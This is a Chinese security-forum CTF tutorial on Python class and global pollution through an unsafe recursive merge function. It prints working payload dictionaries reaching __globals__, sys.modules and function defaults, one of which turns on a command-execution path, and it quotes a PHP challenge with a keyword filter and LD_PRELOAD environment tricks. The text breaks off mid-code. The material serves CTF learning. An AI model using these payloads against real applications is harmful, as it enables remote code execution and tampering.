---
title: Python prototype chain pollution
url: https://forum.butian.net/share/3615
source: 奇安信攻防社区
date: 2024-07-12
fetch_date: 2025-10-06T17:38:26.982701
---

# Python prototype chain pollution

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Python prototype chain pollution

* [CTF](https://forum.butian.net/topic/52)

在研究了Nodejs原型链污染之后，我注意到了国赛中出现的一个知识点Python原型链污染，同时我注意到CTFSHOW上的一个题目，于是我开始学习它并写了这篇简单的文章。

前言
==
在研究了Nodejs原型链污染之后，我注意到了国赛中出现的一个知识点Python原型链污染，同时我注意到CTFSHOW上的一个题目，于是我开始学习它并写了这篇简单的文章。
从Merge开始
========
我们这里还是从常见的merge函数来做入手举例，因为其实对于原型链污染来说，本质上都是一个东西，只是基于不同的语言特性，某些存在局限性，但是讲到merge大家都应该想到和原型链污染有关。
这里我就把这个关键的merge的定义放在这里，其实是同nodejs一样的操作
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '\_\_getitem\_\_'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)
```
可以看到也是通过键值互换来进行的污染，但是这里要注意在python中的object的属性是不可以被污染的，具体的后面会说。
一个最简单的实例：
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '\_\_getitem\_\_'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)
class ctfer:
flag = "flag{fake\_flag}"
class Delete(ctfer):
pass
class Chu0(ctfer):
pass
ctf1 = Delete()
ctf2 = Chu0()
evil\_playload = {
"\_\_class\_\_":
{
"\_\_base\_\_":
{
"flag": "flag{really\_flag}"
}
}
}
print(ctf1.flag)
print(ctf2.flag)
merge(evil\_playload, ctf1)
print(ctf1.flag)
print(ctf2.flag)
```
运行结果，可以看到是被污染的了
![Pasted image 20240710163642.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/07/attach-514c1d1e5c13afea5a33693fcd533afc44bf0356.png)
然后其他的例如修改内置属性也是ok的这里就不写了。
记住object的属性是无法被污染的`
```python
merge(evil\_playload,object)
print(object)
#TypeError: cannot set 'flag' attribute of immutable type 'object'
```
可以看到会报错的
Question1
=========
这里就产生了一个问题，我们在上述的写法当中是利用Delete去继承了ctfer这个类的，这样子我们才可以通过基类去污染其属性值，但是如果不存在这个继承关系的时候我们应该如何去污染呢？
\\_\\globals\\_\\_
---------------
我们就可以去思索一下关于python的一些问题，例如在SSTI中我们是如何去获取我们可用的属性或者说方法呢？
应该很直观就能想到，是他——`\_\_globals\_\_`.
`\_\_globals\_\_` 是 Python 函数对象的一个属性，它返回包含函数定义时的全局变量的字典。通过这个属性，你可以访问和修改函数定义所在的模块中的全局变量。
```python
x = 10 # 全局变量
def my\_function():
print(x) # 打印全局变量 x
def modify\_global\_var():
my\_function.\_\_globals\_\_['x'] = 20 # 修改全局变量 x
my\_function() # 输出 10
modify\_global\_var()
my\_function() # 输出 20
```
可以看到实例当中我们通过这个属性来改变了全局变量中的x。
所以我们就可以这样去构造一下playload
```python
evil\_playload = {
"\_\_init\_\_":{
"\_\_globals\_\_":{
"flag" : "flag{really\_flag}"
}
}
}
```
这样子就可以去应对于不存在继承链的情况
Question2
=========
我们再想要一个场景，虽然说在一些题目场景来说，大多都是在main.py中去import一个test.py，并且关系比较简单的时候，通常都可以利用上面的方法来进行污染，当关系比较复杂的时候就比较麻烦，例如多层import 或者导入第三方库来导入的时候比较麻烦，这里就提供了几个方法
Module sys
----------
我们这里就可以利用sys来实现。这个应该不用多说了
main.py
```python
import test1
import sys
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '\_\_getitem\_\_'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)
class Test():
def \_\_init\_\_(self):
pass
evil\_playload = {
"\_\_init\_\_":{
"\_\_globals\_\_":{
"sys":{
"modules":{
"test1":{
"Test1": {
"flag" :"flag{really\_flag}"
}
}
}
}
}
}
}
test = Test()
print(test1.Test1.flag)
merge(evil\_playload,test)
print(test1.Test1.flag)
```
test1.py
```python
class Test1:
flag = "flag{fake\_flag}"
```
Loader加载器
---------
我们的sys使用是在题目环境中有给你sys的情况下才会可以使用的，但是如果题目不给你，那么sys基本上也是G了，所以咱们就着手一下其他方面
为了进一步优化，这里采用方式是利用`Python`中加载器`loader`，在官方文档中给出的定义是
![Pasted image 20240710172545.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/07/attach-d13cd09d7e597fdb5e7f6e8b6a82738fcb61d8c2.png)
也就是加载类的东西。
### about spec
`\_\_spec\_\_`内置属性在`Python 3.4`版本引入，其包含了关于类加载时的信息，本身是定义在`Lib/importlib/\_bootstrap.py`的类`ModuleSpec`，显然因为定义在`importlib`模块下的`py`文件，所以可以直接采用`&lt;模块名&gt;.\_\_spec\_\_.\_\_init\_\_.\_\_globals\_\_['sys']`获取到`sys`模块
所以我们就可以利用任意的类来进行加载sys从而达到前面的目的
这里有个demo可以看看‘
```python
import math
# 获取模块的loader
loader = math.\_\_spec\_\_.\_\_init\_\_.\_\_globals\_\_['sys']
# 打印loader信息
print(loader.modules)
# {'sys': , 'builtins': , '\_frozen\_importlib': , .......
```
可以看到我们就可以这么去调用从而去搭配利用打组合拳
默认值替换
=====
函数形参
----
主要用到了函数的`\_\_defaults\_\_`和`\_\_kwdefaults\_\_`这两个内置属性
### \\_\\_defaults\\_\\_
`\_\_defaults\_\_` 是 Python 函数对象的一个属性，它包含函数的默认参数值。`\_\_defaults\_\_` 返回一个包含默认参数值的元组。如果函数没有默认参数，`\_\_defaults\_\_` 返回 `None`。
具体的内容可以看这里
[python函数的位置参数(Positional)和关键字参数(keyword) - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/412273465)
根据文章的最后面，我们可以总结一下(巧记一下)：
- `/`前面都为仅位置参数
- `/` 后`\*`前都为位置或关键字参数
- `\*`后都为仅关键字参数
- 仅位置参数不可以利用`变量名 = 变量`赋值，位置或关键字参数可以利用其赋值，也可以不赋值，仅关键词参数必须用`变量名=值`来赋值
```python
def func\_a(var\_1, var\_2 =2, var\_3 = 3):
pass
def func\_b(var\_1, /, var\_2 =2, var\_3 = 3):
pass
def func\_c(var\_1, var\_2 =2, \*, var\_3 = 3):
pass
def func\_d(var\_1, /, var\_2 =2, \*, var\_3 = 3):
pass
print(func\_a.\_\_defaults\_\_)
#(2, 3)
print(func\_b.\_\_defaults\_\_)
#(2, 3)
print(func\_c.\_\_defaults\_\_)
#(2,)
print(func\_d.\_\_defaults\_\_)
#(2,)
```
所以在污染中可以这样
```python
def evil(arg\_1 , shell = False):
if not shell:
print(arg\_1)
else:
print(\_\_import\_\_("os").popen(arg\_1).read())
evil\_playload = {
"\_\_init\_\_":{
"\_\_globals\_\_":{
"evil":{
"\_\_defaults\_\_":{
True,
}
}
}
}
}
```
其实也就是我们如果去获取evil函数的defaluts属性的时候就只能获取到位置或关键字参数，所以这里的defaults默认指向的就是shell这个参数，所以就可以进行污染
### \\_\\_kwdefaluts\\_\\_
`\_\_kwdefaults\_\_`以字典的形式按从左到右的顺序收录了函数键值形参的默认值，从代码上来看，则是如下的效果：
```python
def func\_a(var\_1, var\_2 =2, var\_3 = 3):
pass
def func\_b(var\_1, /, var\_2 =2, var\_3 = 3):
pass
def func\_c(var\_1, var\_2 =2, \*, var\_3 = 3):
pass
def func\_d(var\_1, /, var\_2 =2, \*, var\_3 = 3):
pass
print(func\_a.\_\_kwdefaults\_\_)
#None
print(func\_b.\_\_kwdefaults\_\_)
#None
print(func\_c.\_\_kwdefaults\_\_)
#{'var\_3': 3}
print(func\_d.\_\_kwdefaults\_\_)
#{'var\_3': 3}
```
可以看到他仅获取了仅关键字参数，并且返回是以字典的形式返回的。
所以同样的
```python
def evil(arg\_1 ,\*,shell = False):
if not shell:
print(arg\_1)
else:
print(\_\_import\_\_("os").popen(arg\_1).read())
evil\_payload = {
"\_\_init\_\_" : {
"\_\_globals\_\_" : {
"evilFunc" : {
"\_\_kwdefaults\_\_" : {
"shell" : True
}
}
}
}
}
```
这样子就可以进行污染了。
特定值污染
-----
### 环境变量污染
在这几天的i春秋的比赛当中出了这么一个赛题
```php
&lt;?php
highlight\_file(\_\_FILE\_\_);
error\_reporting(E\_ALL);
ini\_set('display\_errors', 1);
function filter($a)
{
$pattern = array('\'', '"','%','\(','\)',';','bash');
$pattern = '/' . implode('|', $pattern) . '/i';
if(preg\_match($pattern,$a)){
die("No injecting!!!");
}
return $a;
}
class ENV{
public $key;
public $value;
public $math;
public function \_\_toString()
{
$key=filter($this-&gt;key);
$value=filter($this-&gt;value);
putenv("$key=$value");
system("cat hints.txt");
}
public function \_\_wakeup()
{
if (isset($this-&gt;math-&gt;flag))
{
echo getenv("LD\_PRELOAD");
echo "YesYes";
} else {
echo "YesYesYes";
}
}
}
class DIFF{
public $callback;
public $back;
private $flag;
public function \_\_isset($arg1)
{
system("cat /flag");
$this-&gt;callback-&gt;p;
echo "You are stupid, what exactly is your identity?";
}
}
class FILE{
public $filename;
public $enviroment;
public function \_\_get($arg1){
if("hacker"==$this-&gt;enviroment){
echo "Hacker is bad guy!!!";
}
}
public function \_\_call($function\_name,$value)
{
if (preg\_match('/\.[^.]\*$/', $this-&gt;filename, $matches)) {
$uploadDir = "/tmp/";
$destination = $uploadDir . md5(time()) . $matches[0];
if ...